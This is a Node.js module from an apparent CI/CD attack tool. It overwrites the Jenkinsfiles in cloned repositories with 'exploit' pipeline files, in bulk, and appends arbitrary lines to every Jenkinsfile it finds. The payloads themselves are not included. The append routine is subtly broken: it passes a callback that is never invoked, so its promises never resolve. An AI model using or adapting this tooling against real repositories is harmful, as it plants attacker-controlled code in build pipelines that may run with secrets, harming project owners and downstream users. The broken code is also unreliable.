const log = console.log,
      chalk = require('chalk'),
      readline = require('readline'),
      repodir = __dirname + '/../../repos',
      exdir = __dirname + '/../exploits',
      repolist = __dirname + '/../../configs/repos',
      files = require(__dirname + '/../lib/files'),
      targets = require(__dirname + '/../lib/targets'),
      fs = require('fs');

module.exports = {

  // Checks checks repo to see if it contains Jenkins-ci content
  isJenkinsRepo: (reponame) => {
    return fs.existsSync(`${repodir}/${reponame}/Jenkinsfile`);
  },

  //Loads an exploit into said repo
  loadJenkinsConfig: (exploit, authed_user, repo_name, callback) => {
    if (module.exports.isJenkinsRepo(repo_name)) {
      fs.createReadStream(`${exdir}/${exploit}/Jenkinsfile`).pipe(fs.createWriteStream(`${repodir}/${repo_name}/Jenkinsfile`).on('close', () => {
        log(chalk.green(`Jenkins config for ${repo_name} successfully overwritten`));
        return callback();
      }));
    }
    else {
      log(chalk.yellow(`Tried to load ${exploit}, but ${repo_name} does not appear to be a Jenkins-Repository`));
      return callback();
    }
  },

  loadJenkinsConfigAll: (exploit, authed_user, jenkins_targets, callback) => {
    const promises = [];
    for(let target in jenkins_targets) {
      promises.push(new Promise((resolve, reject) => {
        module.exports.loadJenkinsConfig(exploit, authed_user, jenkins_targets[target], () => {
          resolve();
        });
      }));
    }
    Promise.all(promises)
      .then(c => {
        return callback();
      }).catch(e => {
        log(chalk.red(`ERROR with function loadJenkinsConfigAll: ... ${e}`));
        return callback();
      });
  },

  //Get a list of cloned repos that contain Jenkinsfile files
  getForkedJenkinsRepos: (callback) => {
    const flist = files.walkSync(repodir),
          tlist = [];
    flist.forEach((item) => {
      if (item.includes("Jenkinsfile") && !item.includes("node_modules")) {
        tlist.push(item);
      }
    });
    return callback(tlist);
  },

  //Append line to jenkins config
  appendJenkinsConfig: (file, line) => {
    fs.appendFileSync(file, line, 'utf-8');
  },

  appendJenkinsConfigAll: (line, callback) => {
    const flist = files.walkSync(repodir),
          promises = [];
    for (let f in flist) {
      if (flist[f].includes('Jenkinsfile')) {
        promises.push(new Promise((resolve, reject) => {
          module.exports.appendJenkinsConfig(flist[f], line, () => {
            resolve();
          });
        }).catch(err => {
          log(err);
        }));
      }
    }
    //.on('close', () => {
    Promise.all(promises)
      .then(c => {
        return callback();
      }).catch(e => {
        log(chalk.red(`ERROR with function appendJenkinsConfigAll: ... ${e}`));
        return callback();
      });
  }
}